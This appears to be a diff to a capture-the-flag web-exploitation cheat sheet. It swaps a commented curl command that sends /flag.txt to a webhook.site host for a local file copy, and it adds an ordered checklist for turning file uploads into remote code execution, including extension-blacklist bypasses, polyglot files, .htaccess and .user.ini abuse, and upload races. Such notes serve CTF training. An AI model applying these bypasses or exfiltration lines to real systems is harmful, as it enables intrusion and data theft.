@@ -56,7 +56,7 @@ For injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggli
 ### Exfiltration
 ```ruby
 open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
-# Or: Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
+# Or, when outbound is blocked: Process.spawn("cp /flag.txt /tmp/leak.txt").tap{|pid| Process.wait(pid)}
 ```
 
 **Key insight:** Ruby's `instance_eval` and `Kernel#open` are common injection sinks. When keywords like `File`, `system`, or `IO` are blocked, use `open('|cmd')` or `Process.spawn` -- Ruby has many built-in ways to execute commands that bypass simple blocklists.
@@ -257,6 +257,12 @@ def leak_char(known_prefix, position):
 ---
 
 ## File Upload to RCE Techniques
+
+**Try in this order, stop at the first one that works:**
+1. Extension blacklist: `.php3` / `.phtml` / `.phar`, trailing dot or space, `%00`.
+2. `Content-Type` and magic bytes: `GIF89a` prefix, polyglot, MIME mismatch.
+3. Parser config: `.htaccess` (`AddType`), `.user.ini` (`auto_prepend_file`).
+4. Path traversal to a served/executed location, then race the validate-then-write gap.
 
 **Key insight:** File upload vulnerabilities become RCE when you can control either the file extension (`.htaccess`, `.php`, `.so`) or the upload path (path traversal). Try uploading server config files (`.htaccess`), shared libraries (`.so`), or use log poisoning as fallback when direct code upload is blocked.
 
